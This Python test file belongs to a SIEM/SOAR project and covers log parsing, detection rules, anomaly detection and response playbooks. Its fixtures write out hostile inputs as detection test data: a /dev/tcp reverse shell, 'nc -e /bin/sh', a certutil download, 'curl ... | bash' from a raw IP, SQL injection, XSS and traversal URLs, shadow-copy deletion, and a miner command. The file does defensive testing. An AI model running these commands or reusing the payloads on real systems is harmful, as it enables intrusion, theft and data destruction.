"""Unit test cho normalize + enrich + rule engine + ML + SOAR (không cần Kafka/ES).
Chạy: cd server && python -m pytest -q
"""
from __future__ import annotations

import json
import re
from datetime import datetime, timedelta, timezone
from pathlib import Path

import pytest

from siem.detection import alerts as alert_builder
from siem.detection.ml import AnomalyDetector
from siem.detection.rules import RuleEngine, load_rules
from siem.pipeline.enrich import Enricher
from siem.pipeline.normalize import get, normalize

ROOT = Path(__file__).resolve().parent.parent
T0 = datetime(2026, 9, 24, 10, 0, 0, tzinfo=timezone.utc)


def raw(event_type, data, source="file", agent="S001-Web-01", ts=None):
    return {"timestamp": (ts or T0).isoformat(), "agent_id": agent, "hostname": "Web-01", "os": "linux",
            "source": source, "event_type": event_type, "data": data}


def apache(ip, req, status=200, ua="Mozilla/5.0", ts=None):
    t = (ts or T0).strftime("%d/%b/%Y:%H:%M:%S +0000")
    return raw("apache_access", {"message": f'{ip} - - [{t}] "{req}" {status} 512 "-" "{ua}"'}, ts=ts)


@pytest.fixture(scope="module")
def enricher():
    return Enricher(ROOT / "config")


@pytest.fixture()
def engine():
    return RuleEngine(load_rules(ROOT / "rules"))


def run(engine, enricher, raws):
    fired = []
    for r in raws:
        doc = enricher.enrich(normalize(r))
        fired += [d.rule.id for d in engine.process(doc)]
    return fired


# ------------------------------------------------------------------ normalize
def test_apache_access_parse():
    d = normalize(apache("10.0.0.5", "GET /index.php?id=1%27%20UNION%20SELECT%201,2-- HTTP/1.1", 200))
    assert get(d, "source.ip") == "10.0.0.5"
    assert get(d, "http.request.method") == "GET"
    assert get(d, "http.response.status_code") == 200
    assert get(d, "url.path") == "/index.php"
    assert "UNION SELECT" in get(d, "url.decoded")
    assert d["@timestamp"].startswith("2026-09-24T10:00:00")


def test_ssh_auth_parse():
    d = normalize(raw("auth", {"message": "Sep 24 10:00:01 web01 sshd[811]: Failed password for invalid user admin from 203.0.113.9 port 50122 ssh2"}))
    assert get(d, "event.category") == "authentication"
    assert get(d, "event.outcome") == "failure"
    assert get(d, "user.name") == "admin"
    assert get(d, "source.ip") == "203.0.113.9"
    d2 = normalize(raw("auth", {"message": "2026-09-24T10:00:02.123+07:00 web01 sshd[812]: Accepted password for root from 10.1.1.1 port 4000 ssh2"}))
    assert get(d2, "event.outcome") == "success" and get(d2, "user.name") == "root"


def test_windows_4625_and_sysmon():
    d = normalize(raw("windows_event", {"event_id": 4625, "channel": "Security", "computer": "PC-01",
                                        "fields": {"TargetUserName": "admin", "IpAddress": "10.0.0.66", "LogonType": "10"}},
                      source="eventlog", agent="A001-PC-01"))
    assert get(d, "event.code") == 4625 and get(d, "event.outcome") == "failure"
    assert get(d, "winlog.logon.type") == "remote_interactive"
    s = normalize(raw("windows_event", {"event_id": 1, "channel": "Microsoft-Windows-Sysmon/Operational",
                                        "fields": {"Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                                                   "CommandLine": "powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAA=",
                                                   "ParentImage": "C:\\Program Files\\Microsoft Office\\WINWORD.EXE",
                                                   "ProcessId": "4242", "Hashes": "MD5=ABC,SHA256=DEF"}},
                      source="eventlog", agent="A001-PC-01"))
    assert get(s, "process.name") == "powershell.exe"
    assert get(s, "process.parent.name") == "WINWORD.EXE"
    assert get(s, "process.hash.sha256") == "def"
    assert get(s, "process.pid") == 4242


def test_firewall_iptables_and_pfsense():
    d = normalize(raw("syslog", {"message": "<4>Sep 24 10:00:00 fw01 kernel: [UFW BLOCK] IN=eth0 OUT= MAC=00 SRC=198.51.100.7 DST=192.168.1.10 LEN=40 PROTO=TCP SPT=40000 DPT=3389 WINDOW=1024",
                                  "sender_ip": "192.168.1.1"}, source="syslog", agent="syslog-192.168.1.1"))
    assert get(d, "event.category") == "network" and get(d, "event.action") == "deny"
    assert get(d, "destination.port") == 3389 and get(d, "host.name") == "fw01"
    pf = "5,,,1000000103,em0,match,block,in,4,0x0,,64,0,0,DF,6,tcp,60,203.0.113.50,192.168.1.10,51000,22,0,S,1,,64240,,mss"
    d2 = normalize(raw("syslog", {"message": f"<134>Sep 24 10:00:00 pfsense filterlog[123]: {pf}", "sender_ip": "192.168.1.1"}, source="syslog"))
    assert get(d2, "event.module") == "pfsense" and get(d2, "source.ip") == "203.0.113.50" and get(d2, "destination.port") == 22


def test_suricata_eve():
    eve = {"timestamp": "2026-09-24T10:00:00.000000+0000", "event_type": "alert", "src_ip": "203.0.113.5", "src_port": 4444,
           "dest_ip": "192.168.1.10", "dest_port": 80, "proto": "TCP",
           "alert": {"signature": "ET WEB_SERVER SQL Injection", "signature_id": 2006445, "severity": 1, "category": "Web Application Attack"}}
    d = normalize(raw("suricata", {"message": json.dumps(eve)}))
    assert get(d, "event.category") == "intrusion_detection" and get(d, "suricata.severity") == 1


# Event Wazuh dựng đúng như archives.json (4.14.8) khi wazuh-manager nhận syslog 514: agent 000, location = IP gửi, full_log đã bỏ <PRI>
PF_BLOCK = "5,,,1000000103,em0,match,block,in,4,0x0,,64,0,0,DF,6,tcp,60,203.0.113.50,192.168.1.10,51000,22,0,S,1,,64240,,mss"
SSH_FAIL = "Failed password for invalid user admin from 203.0.113.9 port 50122 ssh2"


def wazuh_event(agent_id, name, location, full_log):
    return raw("wazuh", {"timestamp": "2026-11-01T07:47:09.929+0000", "agent": {"id": agent_id, "name": name},
                         "manager": {"name": "wazuh-manager"}, "id": "1793519229.479", "full_log": full_log,
                         "decoder": {}, "location": location}, source="wazuh", agent="wazuh")


def wazuh_syslog(ip, line):
    return wazuh_event("000", "wazuh-manager", ip, re.sub(r"^<\d+>", "", line))


def wazuh_agent_event(agent_id, location, line):
    return wazuh_event(agent_id, "web01", location, line)


def test_wazuh_syslog_keeps_source_identity():
    d = normalize(wazuh_syslog("10.10.40.254", "<134>Nov  1 10:00:00 fw01 filterlog[1]: " + PF_BLOCK))
    assert get(d, "agent.id") == "syslog-10.10.40.254" and get(d, "observer.ip") == "10.10.40.254"
    assert get(d, "host.name") == "fw01" and get(d, "event.module") == "pfsense"
    assert get(d, "source.ip") == "203.0.113.50" and get(d, "destination.port") == 22


def test_wazuh_syslog_without_header_host_falls_back_to_ip():
    d = normalize(wazuh_syslog("10.10.40.254", "filterlog[1]: " + PF_BLOCK))
    assert get(d, "host.name") == "10.10.40.254"


def test_wazuh_syslog_ssh_and_ipv6_sender():
    d = normalize(wazuh_syslog("fd00::1", "<38>Nov  1 10:00:01 web01 sshd[811]: " + SSH_FAIL))
    assert get(d, "agent.id") == "syslog-fd00::1" and get(d, "event.module") == "auth"
    assert get(d, "source.ip") == "203.0.113.9" and get(d, "event.outcome") == "failure"


def test_wazuh_syslog_long_suricata_eve():
    eve = {"timestamp": "2026-11-01T10:00:00.000000+0000", "event_type": "alert", "src_ip": "203.0.113.5", "src_port": 4444,
           "dest_ip": "192.168.1.10", "dest_port": 80, "proto": "TCP", "http": {"url": "/" + "x" * 2500},
           "alert": {"signature": "ET WEB_SERVER SQL Injection", "signature_id": 2006445, "severity": 1, "category": "Web Application Attack"}}
    line = "<134>Nov  1 10:00:02 sur01 suricata[9]: " + json.dumps(eve)
    assert len(line) > 2048
    d = normalize(wazuh_syslog("10.10.40.254", line))
    assert get(d, "event.module") == "suricata" and get(d, "suricata.signature") == "ET WEB_SERVER SQL Injection"
    assert get(d, "agent.id") == "syslog-10.10.40.254"


def test_wazuh_syslog_rfc5424_filterlog():
    # remoted chỉ bỏ <PRI>: full_log bắt đầu bằng "1 <thời gian ISO> ..." (phiên bản RFC5424)
    d = normalize(wazuh_syslog("10.10.40.254", "<134>1 2026-11-01T10:00:00+00:00 fw01 filterlog 4321 - - " + PF_BLOCK))
    assert get(d, "host.name") == "fw01" and get(d, "event.module") == "pfsense"
    assert get(d, "source.ip") == "203.0.113.50" and get(d, "destination.port") == 22


def test_wazuh_syslog_rfc5424_suricata():
    eve = {"timestamp": "2026-11-01T10:00:00.000000+0000", "event_type": "alert", "src_ip": "203.0.113.5", "src_port": 4444,
           "dest_ip": "192.168.1.10", "dest_port": 80, "proto": "TCP",
           "alert": {"signature": "ET WEB_SERVER SQL Injection", "signature_id": 2006445, "severity": 1, "category": "Web Application Attack"}}
    d = normalize(wazuh_syslog("10.10.40.254", "<134>1 2026-11-01T10:00:02+00:00 sur01 suricata 9 - - " + json.dumps(eve)))
    assert get(d, "host.name") == "sur01" and get(d, "event.module") == "suricata"
    assert get(d, "suricata.signature") == "ET WEB_SERVER SQL Injection"


FORGED_AUDIT = {"audit": {"type": "EXECVE", "exe": "/usr/bin/nc", "command": "nc",
                          "execve": {"a0": "nc", "a1": "-e", "a2": "/bin/sh"}}}
FORGED_WIN = {"win": {"system": {"eventID": "1", "providerName": "Microsoft-Windows-Sysmon"},
                      "eventdata": {"image": "C:\\Windows\\System32\\certutil.exe",
                                    "commandLine": "certutil -urlcache -f http://x/a.exe a.exe"}}}


def _with_data(ev, data):
    ev["data"]["data"] = data
    return ev


@pytest.mark.parametrize("data,line", [
    (FORGED_AUDIT, 'type=EXECVE msg=audit(1.1:1): argc=3 a0="nc" a1="-e" a2="/bin/sh"'),
    (FORGED_WIN, '{"win":{}}'),
    (None, "siem-proc: pid=4242 ppid=1 uid=0 name=sh parent=httpd exe=/bin/sh cmd=sh -c id"),
    (None, "siem-xdr: action=deadbeefcafe type=block_ip target=203.0.113.9 status=success"),
])
def test_syslog_cannot_forge_agent_telemetry(data, line):
    # syslog qua UDP giả được IP nguồn: nội dung chỉ được qua bộ đọc syslog, không thành event tiến trình / kết quả lệnh
    ev = wazuh_syslog("10.10.40.254", line)
    d = normalize(_with_data(ev, data) if data else ev)
    assert get(d, "agent.id") == "syslog-10.10.40.254"
    assert get(d, "event.category") != "process" and get(d, "process.command_line") is None
    assert get(d, "event.module") not in ("auditd", "sysmon", "windows", "siem-xdr")


def test_agent_audit_event_still_parsed():
    ev = _with_data(wazuh_agent_event("001", "/var/log/audit/audit.log", 'type=EXECVE argc=3 a0="nc"'), FORGED_AUDIT)
    d = normalize(ev)
    assert get(d, "event.category") == "process" and "nc" in get(d, "process.command_line")


def test_agent_event_is_not_treated_as_syslog():
    d = normalize(wazuh_agent_event("001", "/var/log/auth.log", "Nov  1 10:00:01 web01 sshd[811]: " + SSH_FAIL))
    assert get(d, "agent.id") == "001" and get(d, "observer.ip") is None
    d = normalize(wazuh_event("000", "wazuh-manager", "wazuh-monitord", "ossec: Manager started."))
    assert get(d, "agent.id") == "000" and get(d, "observer.ip") is None


def test_garbage_does_not_crash():
    for r in [raw("apache_access", {"message": "garbage"}), raw("windows_event", {}), raw("unknown", {"x": 1}),
              raw("auth", {"message": ""}), {"data": None}]:
        d = normalize(r)
        assert "event" in d


# ------------------------------------------------------------------ enrich
def test_threat_intel_and_assets(enricher):
    d = enricher.enrich(normalize(apache("198.51.100.23", "GET / HTTP/1.1")))
    assert get(d, "threat.matched") is True
    assert get(d, "asset.id") == "S001" and get(d, "asset.criticality") == "high"
    assert get(d, "source.ip_scope") == "public"


# ------------------------------------------------------------------ rules
def test_rules_load(engine):
    assert len(engine.rules) >= 35


@pytest.mark.parametrize("req,rule", [
    ("GET /item.php?id=1%27%20or%20%271%27=%271 HTTP/1.1", "WEB-001"),
    ("GET /search?q=%3Cscript%3Ealert(1)%3C/script%3E HTTP/1.1", "WEB-002"),
    ("GET /view?file=../../../../etc/passwd HTTP/1.1", "WEB-003"),
    ("GET /ping?host=127.0.0.1;cat%20/etc/passwd HTTP/1.1", "WEB-004"),
    ("GET /uploads/shell.php?cmd=id HTTP/1.1", "WEB-008"),
])
def test_web_attacks(engine, enricher, req, rule):
    assert rule in run(engine, enricher, [apache("10.0.0.50", req)])


def test_benign_web_no_alert(engine, enricher):
    reqs = ["GET / HTTP/1.1", "GET /products?id=12&sort=price HTTP/1.1", "GET /static/app.js HTTP/1.1",
            "POST /api/cart HTTP/1.1", "GET /blog/select-the-best-union-plan HTTP/1.1"]
    assert run(engine, enricher, [apache("10.0.0.51", r) for r in reqs]) == []


def test_scanner_ua(engine, enricher):
    assert "WEB-005" in run(engine, enricher, [apache("10.0.0.52", "GET / HTTP/1.1", ua="sqlmap/1.7#stable")])


def test_ssh_bruteforce_then_success(engine, enricher):
    evs = [raw("auth", {"message": f"Sep 24 10:00:0{i} web01 sshd[9{i}]: Failed password for root from 10.9.9.9 port 5000{i} ssh2"},
               ts=T0 + timedelta(seconds=i)) for i in range(6)]
    evs.append(raw("auth", {"message": "Sep 24 10:00:09 web01 sshd[99]: Accepted password for root from 10.9.9.9 port 50010 ssh2"},
                   ts=T0 + timedelta(seconds=9)))
    fired = run(engine, enricher, evs)
    assert fired.count("AUTH-001") == 1   # threshold chỉ bắn 1 lần nhờ suppress
    assert "AUTH-002" in fired            # sequence: brute-force rồi thành công
    assert "AUTH-004" in fired            # đăng nhập root


def test_threshold_respects_window(engine, enricher):
    # 5 lần thất bại nhưng rải trong 5 phút -> không phải brute-force
    evs = [raw("auth", {"message": f"Sep 24 10:0{i}:00 web01 sshd[1]: Failed password for bob from 10.8.8.8 port 1 ssh2"},
               ts=T0 + timedelta(minutes=i)) for i in range(5)]
    assert "AUTH-001" not in run(engine, enricher, evs)


def test_port_scan_distinct(engine, enricher):
    evs = [raw("syslog", {"message": f"Sep 24 10:00:00 fw kernel: DROP IN=eth0 SRC=10.7.7.7 DST=192.168.1.10 PROTO=TCP SPT=40000 DPT={p}",
                          "sender_ip": "192.168.1.1"}, source="syslog", ts=T0 + timedelta(milliseconds=p)) for p in range(20, 45)]
    assert "NET-001" in run(engine, enricher, evs)


def test_windows_rules(engine, enricher):
    def win(eid, fields, channel="Security"):
        return raw("windows_event", {"event_id": eid, "channel": channel, "fields": fields}, source="eventlog", agent="A001-PC-01")
    fired = run(engine, enricher, [
        win(1102, {"SubjectUserName": "eve"}),
        win(4732, {"TargetUserName": "Administrators", "MemberName": "CN=eve"}),
        win(1, {"Image": "C:\\x\\powershell.exe", "ParentImage": "C:\\x\\WINWORD.EXE",
                "CommandLine": "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAA="},
            channel="Microsoft-Windows-Sysmon/Operational"),
        win(1, {"Image": "C:\\x\\vssadmin.exe", "CommandLine": "vssadmin.exe delete shadows /all /quiet"},
            channel="Microsoft-Windows-Sysmon/Operational"),
    ])
    for rid in ("WIN-002", "WIN-004", "WIN-005", "WIN-008", "WIN-010"):
        assert rid in fired, rid


def test_linux_process_rules(engine, enricher):
    def proc(name, cmd, parent="bash"):
        return raw("process_creation", {"pid": 4321, "ppid": 1, "name": name, "command_line": cmd, "parent_name": parent}, source="process")
    fired = run(engine, enricher, [
        proc("bash", "bash -i >& /dev/tcp/10.0.0.99/4444 0>&1"),
        proc("sh", "sh -c id", parent="apache2"),
        proc("xmrig", "./xmrig -o stratum+tcp://pool:3333"),
    ])
    assert {"LNX-001", "LNX-002", "LNX-004"} <= set(fired)


def test_rules_ignore_admin_tools_but_keep_attacks(enricher):
    """Báo nhầm lộ ra khi tập lệnh bình thường mở rộng (12/10/2026): WIN-005 bắt lớp vỏ PowerShell của Ansible qua WinRM,
    WIN-013 bắt mọi `schtasks /create` (cả tác vụ sao lưu), LNX-003 bắt bộ cài chính thức dạng `curl ... | bash`.
    Mỗi lệnh chạy trên engine riêng để chặn alert lặp không che kết quả."""
    rules = load_rules(ROOT / "rules")
    ps, st = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "C:\\Windows\\System32\\schtasks.exe"

    def win(image, cmd):
        return raw("windows_event", {"event_id": 1, "channel": "Microsoft-Windows-Sysmon/Operational",
                                     "fields": {"Image": image, "CommandLine": cmd}}, source="eventlog", agent="A001-PC-01")

    def proc(cmd, name="sh"):
        return raw("process_creation", {"pid": 4321, "ppid": 1, "name": name, "command_line": cmd, "parent_name": "bash"},
                   source="process")

    def fired(ev):
        return set(run(RuleEngine(rules), enricher, [ev]))

    benign = {
        "WIN-005": [win(ps, "PowerShell  -NoProfile -NonInteractive -ExecutionPolicy Unrestricted -EncodedCommand "
                            "UwBlAHQALQBTAHQAcgBpAGMAdABNAG8AZABlACAALQBWAGUAcgBzAGkAbwBuACAATABhAHQAZQBzAHQA"),
                    win(ps, '"powershell.exe" -noninteractive -encodedcommand '
                            "WwBDAG8AbgBzAG8AbABlAF0AOgA6AEkAbgBwAHUAdABFAG4AYwBvAGQAaQBuAGcAIAA9ACAA")],
        "WIN-013": [win(st, 'schtasks /create /tn "Backup\\Nightly" /tr "C:\\Scripts\\backup.cmd" /sc daily /st 23:00 /ru SYSTEM /f')],
        "LNX-003": [proc("bash -c 'curl -fsSL https://raw.githubusercontent.com/nvm-sh/nvm/v0.40.1/install.sh | bash'", "bash"),
                    proc("sh -c 'wget -qO- https://get.docker.com | sh'")],
    }
    attack = {
        "WIN-005": [win(ps, "powershell -exec bypass -e SQBuAHYAbwBrAGUALQBXAG0AaQBNAGUAdABoAG8AZAAgAC0AUABhAHQAaAA="),
                    win(ps, '"powershell.exe" -EncodedCommand VwByAGkAdABlAC0ASABvAHMAdAAgACIASABlAHkALAAgAEEAdABvAG0AaQBjACEAIgA=')],
        "WIN-013": [win(st, 'schtasks /create /tn "T1053_005_OnLogon" /sc onlogon /tr "cmd.exe /c calc.exe"'),
                    win(st, 'schtasks /Create /TN "CompMgmtBypass" /TR "compmgmt.msc" /SC ONLOGON /RL HIGHEST /F'),
                    win(st, 'schtasks /create /tn ExplorerSync /tr "javaw -jar %temp%\\..\\Microsoft\\ExplorerSync.db" /sc MINUTE /f'),
                    win(st, 'SCHTASKS /Create /SC ONCE /TN spawn /TR C:\\windows\\system32\\cmd.exe /ST 20:10')],
        "LNX-003": [proc("sh -c 'curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/"
                         "T1074.001/src/Discovery.sh | sh -s'"),
                    # cùng lệnh có bộ cài chính thức và một script lạ: đoạn lạ vẫn bị bắt
                    proc("sh -c 'curl -fsSL https://get.docker.com | sh; curl -s http://203.0.113.5/x.sh | bash'")],
    }
    for rid, evs in benign.items():
        for ev in evs:
            assert rid not in fired(ev), (rid, ev["data"])
    for rid, evs in attack.items():
        for ev in evs:
            assert rid in fired(ev), (rid, ev["data"])


def test_alert_document(engine, enricher):
    doc = enricher.enrich(normalize(apache("198.51.100.23", "GET /a?id=1%20union%20select%201 HTTP/1.1")))
    dets = engine.process(doc)
    a = alert_builder.from_detection(next(d for d in dets if d.rule.id == "WEB-001"))
    assert a["source"]["ip"] == "198.51.100.23" and a["agent"]["id"] == "S001-Web-01"
    assert a["severity_score"] == 3 and a["risk_score"] > 75  # asset critical=high + TI hit
    assert "raw" not in a["trigger_event"]


# ------------------------------------------------------------------ ML
def test_ml_flags_scanner_not_normal(enricher):
    det = AnomalyDetector(window=60, min_samples=10_000, bootstrap=True)
    base = T0.timestamp()
    # 20 người dùng bình thường
    for u in range(20):
        for k in range(10):
            d = enricher.enrich(normalize(apache(f"10.1.0.{u}", f"GET /page{k % 5} HTTP/1.1", 200)))
            det.add(d, base + k)
    # 1 IP quét: 400 request, 90% 404, URL khác nhau
    for k in range(400):
        d = enricher.enrich(normalize(apache("10.66.66.66", f"GET /admin{k}.php HTTP/1.1", 404 if k % 10 else 200)))
        det.add(d, base + k * 0.1)
    anomalies = det.flush(base + 200)
    flagged = {a.ip for a in anomalies}
    assert "10.66.66.66" in flagged
    assert len(flagged & {f"10.1.0.{u}" for u in range(20)}) <= 1


# ------------------------------------------------------------------ SOAR
class FakeES:
    def __init__(self):
        self.docs: dict[str, dict[str, dict]] = {}

    def index(self, index, id, document, **_):
        self.docs.setdefault(index, {})[id] = document

    def update(self, index, id, doc, **_):
        self.docs.setdefault(index, {}).setdefault(id, {}).update(doc)

    def search(self, index, query=None, **_):
        return {"hits": {"hits": []}}


def test_soar_playbook_blocks_ip(monkeypatch):
    from siem import store
    from siem.soar.engine import Notifier, Soar, load_playbooks

    es = FakeES()
    monkeypatch.setattr(store, "list_agents", lambda _es: [{"agent_id": "S001-Web-01", "status": "online"},
                                                           {"agent_id": "A001-PC-01", "status": "online"}])
    soar = Soar(es, load_playbooks(ROOT / "config" / "playbooks.yml"), whitelist=["127.0.0.0/8"], notifier=Notifier())
    alert = {"alert": {"id": "a1", "status": "open", "source": "rule"}, "rule": {"id": "AUTH-001", "name": "bf", "tags": []},
             "severity": "high", "severity_score": 3, "source": {"ip": "10.9.9.9"}, "agent": {"id": "S001-Web-01"}, "count": 5,
             "message": "x"}
    results = soar.handle(alert)
    block = next(r for r in results if r["action"] == "block_ip")
    assert block["status"] == "queued" and len(block["action_ids"]) == 2   # scope: all -> 2 agent
    actions = list(es.docs["siem-actions"].values())
    assert {a["agent_id"] for a in actions} == {"S001-Web-01", "A001-PC-01"}
    assert all(a["type"] == "block_ip" and a["params"]["ip"] == "10.9.9.9" and a["expires_at"] for a in actions)
    assert es.docs["siem-alerts"]["a1"]["alert"]["status"] == "in_progress"
    assert any(r["action"] == "create_case" and r["status"] == "created" for r in results)


def test_soar_whitelist_and_approval():
    from siem.soar.engine import Notifier, Soar, load_playbooks
    es = FakeES()
    soar = Soar(es, load_playbooks(ROOT / "config" / "playbooks.yml"), whitelist=["10.0.0.0/8"], notifier=Notifier())
    alert = {"alert": {"id": "a2", "source": "rule"}, "rule": {"id": "AUTH-002", "name": "x"}, "severity": "critical",
             "severity_score": 4, "source": {"ip": "10.9.9.9"}, "agent": {"id": "S001-Web-01"}, "count": 6, "message": "x"}
    results = soar.handle(alert)
    assert next(r for r in results if r["action"] == "block_ip")["status"] == "skipped"
    assert next(r for r in results if r["action"] == "isolate_host")["status"] == "awaiting_approval"
    assert "siem-actions" not in es.docs


# ------------------------------------------------------------------ case playbook
def test_case_playbook_selection_and_tasks():
    from siem.soar.cases import PHASES, CasePlaybooks
    cp = CasePlaybooks(ROOT / "config" / "case_playbooks.yml")
    pick = lambda *a: cp.select(*a)[0]["id"]               # noqa: E731
    assert pick("WIN-010") == "PB-07" and pick("WIN-002") == "PB-17"     # ransomware tách khỏi xóa nhật ký
    assert pick("WEB-001") == "PB-02" and pick("WEB-009") == "PB-15"     # DoS tách khỏi tấn công web
    assert pick("LNX-002") == "PB-12" and pick("LNX-001") == "PB-03"     # playbook cụ thể thắng LNX-*
    assert pick("AUTH-001") == "PB-01" and pick("AUTH-002") == "PB-09"   # dò mật khẩu / đã đăng nhập được
    assert pick("NET-004") == "PB-18"                                    # cảnh báo IDS (IRM-5), không phải tấn công web
    assert pick("WZH-100100") == "PB-12" and pick("WZH-100101") == "PB-19"   # file mới (webshell) / nội dung bị sửa
    assert pick("KHONG-CO") == "PB-00"                                   # mặc định
    f = cp.build("AUTH-002", "critical")
    assert f["priority"] == "P1" and f["playbook"] == {"id": "PB-09", "name": f["playbook"]["name"],
                                                      "matched_by": "mã rule AUTH-002"}
    assert {t["phase"] for t in f["tasks"]} <= set(PHASES)
    assert any(t["approval"] for t in f["tasks"]) and not any(t["done"] for t in f["tasks"])


def test_every_rule_gets_a_specific_case_playbook():
    """Mỗi rule có quy trình đúng loại sự cố (không rơi vào PB-00 "Điều tra chung"); nhãn duyệt đều có trong bảng
    phân quyền (api.APPROVAL_PERMISSIONS), mã playbook không trùng."""
    import yaml
    from siem.manager.api import APPROVAL_PERMISSIONS
    from siem.soar.cases import CasePlaybooks
    cp = CasePlaybooks(ROOT / "config" / "case_playbooks.yml")
    for r in load_rules(ROOT / "rules"):
        assert cp.select(r.id, r.mitre.get("technique"), r.tags)[0]["id"] != "PB-00", r.id
    data = yaml.safe_load((ROOT / "config" / "case_playbooks.yml").read_text(encoding="utf-8"))
    pbs = data["playbooks"]
    assert len({p["id"] for p in pbs}) == len(pbs)
    tasks = [t for p in pbs for ph in p["phases"] for t in ph["tasks"]] + [t for c in data["common"] for t in c["tasks"]]
    labels = {t.get("approval") for t in tasks if isinstance(t, dict)} - {None}
    assert labels <= set(APPROVAL_PERMISSIONS), labels - set(APPROVAL_PERMISSIONS)


def test_case_playbook_detail_references_and_common_tasks():
    """Playbook chi tiết theo nguồn (CERT SG IRM, CISA, Microsoft...): mỗi task có `detail` (cách làm) nếu cần, mỗi
    playbook có nguồn tham khảo; task chung (ghi chứng cứ, timeline, báo cáo...) gắn vào mọi case, đúng giai đoạn,
    đúng vị trí; case nào cũng đủ 5 giai đoạn, tiêu đề task không trùng trong một case."""
    from siem.soar.cases import PHASES, CasePlaybooks
    cp = CasePlaybooks(ROOT / "config" / "case_playbooks.yml")
    first = {c["phase"]: c["tasks"][0]["title"] for c in cp.common if c.get("position") == "first"}
    last = {c["phase"]: c["tasks"][-1]["title"] for c in cp.common if c.get("position", "last") == "last"}
    for pb in cp.playbooks:
        rule = str((pb.get("match") or ["KHONG-CO"])[0]).replace("*", "001")    # WEB-* -> WEB-001, * -> 001
        f = cp.build(rule, "high", tags=pb.get("tags", []))
        assert f["playbook"]["id"] == pb["id"], pb["id"]
        assert f["references"] and all(r["url"].startswith("https://") for r in f["references"]), pb["id"]
        phases = [t["phase"] for t in f["tasks"]]
        assert phases == sorted(phases, key=PHASES.index) and set(phases) == set(PHASES), pb["id"]   # đúng thứ tự, đủ 5
        titles = [t["title"] for t in f["tasks"]]
        assert len(titles) == len(set(titles)), (pb["id"], [t for t in titles if titles.count(t) > 1])
        by_phase = {ph: [t["title"] for t in f["tasks"] if t["phase"] == ph] for ph in PHASES}
        assert all(by_phase[ph][0] == title for ph, title in first.items()), pb["id"]
        assert all(by_phase[ph][-1] == title for ph, title in last.items()), pb["id"]
    ransom = cp.build("WIN-010", "critical")
    assert len(ransom["tasks"]) >= 40 and sum(bool(t["detail"]) for t in ransom["tasks"]) >= 35
    assert any("vssadmin delete shadows" in (t["detail"] or "") for t in ransom["tasks"])
    krbtgt = next(t for t in cp.build("WIN-007", "critical")["tasks"] if "krbtgt" in t["title"])
    assert "10 giờ" in krbtgt["detail"] and krbtgt["approval"] == "Trưởng nhóm IR"   # CISA CM0050


def test_case_playbook_config_rejects_bad_common(tmp_path):
    from siem.soar.cases import CasePlaybooks
    p = tmp_path / "pb.yml"
    p.write_text("common:\n  - {phase: Chuẩn bị, tasks: [x]}\nplaybooks: []\n", encoding="utf-8")
    with pytest.raises(ValueError, match="common"):
        CasePlaybooks(p)


def test_case_playbook_by_technique_then_tag():
    """Rule không biết trước mã (AI viết: AI-xxx, ruleset Wazuh: WZH-<id>) chọn playbook theo kỹ thuật MITRE rồi tag;
    trước đây chỉ theo mã rule nên rơi hết vào PB-00 / PB-08."""
    from siem.soar.cases import CasePlaybooks
    cp = CasePlaybooks(ROOT / "config" / "case_playbooks.yml")
    assert cp.select("AI-201", ["T1003.001"]) [0]["id"] == "PB-10"      # T1003 khớp kỹ thuật con T1003.001
    assert cp.select("AI-202", ["T1098.004"])[0]["id"] == "PB-13"       # cụ thể nhất thắng: T1098.004 (PB-13) > T1098 (PB-04)
    assert cp.select("AI-203", ["T1098"])[0]["id"] == "PB-04"
    assert cp.select("WZH-87105", [], ["wazuh", "virustotal"]) == (cp.select("LNX-001")[0], "tag virustotal")
    assert cp.select("WZH-510", [], ["wazuh", "rootcheck"])[0]["id"] == "PB-08"
    assert cp.select("WZH-100100", ["T1505.003"], ["syscheck"])[0]["id"] == "PB-12"   # mã rule trước kỹ thuật / tag
    assert cp.select("AI-204", ["T9999"], ["x"])[1] == "mặc định"


def test_case_playbook_config_rejects_bad_technique(tmp_path):
    from siem.soar.cases import CasePlaybooks
    p = tmp_path / "pb.yml"
    p.write_text("playbooks:\n  - {id: PB-X, name: x, techniques: [T10], phases: []}\n", encoding="utf-8")
    with pytest.raises(ValueError, match="kỹ thuật MITRE"):
        CasePlaybooks(p)


def test_soar_opens_case_for_every_medium_alert():
    """Trước 11/10/2026 chỉ alert khớp playbook phản ứng riêng mới có case: 23/40 rule (vd WIN-004 thêm vào nhóm quản
    trị, WIN-002 xóa nhật ký mức critical) không bao giờ có case, PB-04 / PB-05 không bao giờ được dùng. Giờ mọi alert
    từ medium có đúng 1 case (đúng case playbook), từ high có đúng 1 thông báo."""
    from siem.detection.rules import SEVERITY_SCORE
    from siem.soar.cases import CasePlaybooks
    from siem.soar.engine import Notifier, Soar, load_playbooks
    cp = CasePlaybooks(ROOT / "config" / "case_playbooks.yml")
    for r in load_rules(ROOT / "rules"):
        es = FakeES()
        soar = Soar(es, load_playbooks(ROOT / "config" / "playbooks.yml"), whitelist=[], notifier=Notifier(),
                    case_playbooks=cp)
        res = soar.handle({"alert": {"id": f"a-{r.id}", "source": "rule"}, "severity": r.severity,
                           "severity_score": SEVERITY_SCORE[r.severity], "agent": {"id": "001"}, "message": "x",
                           "source": {"ip": "203.0.113.7"}, "process": {"pid": 4242, "name": "sh"},
                           "rule": {"id": r.id, "name": r.title, "tags": r.tags, "mitre": r.mitre}})
        cases = list(es.docs.get("siem-cases", {}).values())
        notified = [x for x in res if x["action"] == "notify" and x["status"] != "skipped"]
        medium = SEVERITY_SCORE[r.severity] >= SEVERITY_SCORE["medium"]
        assert len(cases) == (1 if medium else 0), r.id
        assert not cases or cases[0]["playbook"]["id"] == cp.select(r.id, r.mitre.get("technique"), r.tags)[0]["id"]
        assert len(notified) == (1 if SEVERITY_SCORE[r.severity] >= SEVERITY_SCORE["high"] else 0), r.id


def test_soar_case_gets_playbook():
    from siem.soar.cases import CasePlaybooks
    from siem.soar.engine import Notifier, Soar, load_playbooks
    es = FakeES()
    soar = Soar(es, load_playbooks(ROOT / "config" / "playbooks.yml"), whitelist=["10.0.0.0/8"], notifier=Notifier(),
                case_playbooks=CasePlaybooks(ROOT / "config" / "case_playbooks.yml"))
